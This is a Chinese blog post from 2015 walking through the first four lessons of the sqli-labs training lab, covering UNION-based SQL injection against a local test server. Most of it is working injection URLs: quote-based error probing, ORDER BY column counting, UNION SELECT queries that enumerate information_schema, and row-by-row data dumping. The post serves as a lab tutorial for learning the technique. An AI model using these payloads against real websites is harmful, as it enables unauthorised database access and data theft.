---
id: 590
layout: post
title: 'sqli lab 1 - union 注入，入门'
date: 2015-12-02 20:24:00
author: virusdefender
tags: 安全
---

基于 [sqli labs][1]，下载后自行安装。

Lesson 1
--------

基础知识
 - mysql中可能有用的函数: database(), user(), version(), @@version_compile_os, concat(str1, str2, ...), md5(str), mid(column_name,start[,length])
 - union 查询知识
  - union 用于合并两个或多个 select 语句的结果集，并消去表中任何重复行。union 内部的 select 语句必须拥有相同数量的列，列也必须拥有相似的数据类型，每条 select 语句中的列的顺序必须相同。
  - union 默认会去掉重复记录值再合并成结果集，如果需要保留重复的记录值，请使用 union all。
  - union 结果集中的列名总是等于 union 中第一个 select 语句中的列名。

 1. `http://172.16.61.132/sqli-labs/Less-1/?id=1'`报错，错误信息是`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`，最外层的单引号是字符串的，去掉后 sql 语句就是`'1'' LIMIT 0,1`，可以看出 id字段是字符型的。

 2. `http://172.16.61.132/sqli-labs/Less-1/?id=10000' union select 1, user(), version() --+
`得到用户和 MySQL 版本。`http://172.16.61.132/sqli-labs/Less-1/?id=10000' union select 1, database(), 3 --+`得知当前数据库名字是 security。其实还可以合并到一起的，`http://172.16.61.132/sqli-labs/Less-1/?id=10000' union select 1, 2, concat(user(),database(),version()) --+`

 3. 查看字段数量，在 url 上继续拼接 `order by` 语句。`http://172.16.61.132/sqli-labs/Less-1/?id=1' order by 3 --+`的时候正常，order by 4的时候报错了，说明有三个字段。

 4. `information_schema.schemata`这张表中有所有数据库的列表，`information.tables`有数据库中所有表的名字。通过`http://172.16.61.132/sqli-labs/Less-1/?id=10000' union select 1, count(*), 2 from information_schema.schemata --+
`得到一共有6个数据库。

 5. schemata 这张表里面数据库字段名字就是 `field_name`，因为页面一次只能返回一条数据，我们需要逐条的去查询。
`http://172.16.61.132/sqli-labs/Less-1/?id=10000' union select 1, schema_name, 3 from information_schema.schemata limit 1 offset {offset}--+`，将最后的 offset 从0遍历到5，就得到所有的数据库名字。

 6. 同理，`http://172.16.61.132/sqli-labs/Less-1/?id=10000' union select 1, count(*), 3 from information_schema.tables where table_schema='security'--+`得到 security 数据库中有四张表。`http://172.16.61.132/sqli-labs/Less-1/?id=10000' union select 1, table_name, 3 from information_schema.tables where table_schema='security' limit 1 offset {offset}--+`能获取 security 里面的所有表。

 7. `http://172.16.61.132/sqli-labs/Less-1/?id=10000' union select 1, count(*), 3 from information_schema.columns where table_name='users' and table_schema='security' --+`得到 users 表有三个字段，其实前面已经用 order by 得到了，这个地方是一种新方法。`http://172.16.61.132/sqli-labs/Less-1/?id=10000' union select 1, column_name, 3 from information_schema.columns where table_name='users' and table_schema='security' limit 1 offset {offset}--+`得到三个字段的字段名，id, username, password。只是用来演示，其实这些数据都在页面上能看到。

 8. 前面我们已知有一张表是 security.email，然后可以使用`http://172.16.61.132/sqli-labs/Less-1/?id=10000' union select 1, email_id, 3 from security.emails --+`逐行的去获取数据了，也就是拖库。


Lesson 2
--------

访问`http://172.16.61.132/sqli-labs/Less-2/?id=1'`得到错误信息`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1`，得知这次 id 是数字类型的，主要把 Lesson 1里面的那个单引号去掉就好了，其余的都不用改~

Lesson 3
--------
访问`http://172.16.61.132/sqli-labs/Less-3?id=1'`得到错误信息`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1`，猜测大致的 sql 语句是`select * from users where id = ('$id')`，还是字符型，只是加了一个括号，将 Lesson 1 的代码稍加修改就好了。

Lesson 4
--------
发现单引号不报错了，而双引号会报错，按照 Lesson 1 修改 payloads 就好了。


  [1]: https://github.com/Audi-1/sqli-labs
